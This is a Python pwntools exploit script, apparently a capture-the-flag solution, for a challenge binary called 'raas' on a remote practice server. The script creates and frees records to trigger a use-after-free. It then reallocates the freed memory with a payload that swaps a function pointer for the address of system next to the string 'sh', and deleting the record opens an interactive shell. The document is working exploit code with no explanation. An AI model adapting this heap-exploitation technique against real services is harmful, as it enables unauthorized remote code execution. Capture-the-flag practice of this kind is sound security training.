#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
# io = process('./raas')
# raw_input('debug >')
# gdb.attach(io, 'b * 0x8048a6e')
io = remote('hackme.inndy.tw', 7719)
elf = ELF('./raas')
libc = ELF('../libc-2.23.so.i386')
call_sys = elf.plt['system']

def addint(index, value):
    io.recvuntil('Act > ')
    io.sendline('1')
    io.sendlineafter('Index > ', str(index))
    io.sendlineafter('Type > ', '1')
    io.sendlineafter('Value > ', str(value))

def addstr(index,lenth, value):
    io.recvuntil('Act > ')
    io.sendline('1')
    io.sendlineafter('Index > ', str(index))
    io.sendlineafter('Type > ', '2')
    io.sendlineafter('Length > ', str(lenth))
    io.sendlineafter('Value > ', value)

def delete(index):
    io.sendlineafter('Act > ', '2')
    io.sendlineafter('Index > ', str(index))


def show(index):
    io.recvuntil('Act > ')
    io.sendline('3')
    io.sendlineafter('Index > ', str(index))


if __name__ == '__main__':
    addint(0, 0x11111111)
    addint(1, 0x22222222)
    addint(2, 0x33333333)
    delete(0)
    delete(1)
    payload = 'sh\x00\x00' + p32(call_sys)
    addstr(3,12,payload)
    delete(0)
    io.interactive()
    io.close()

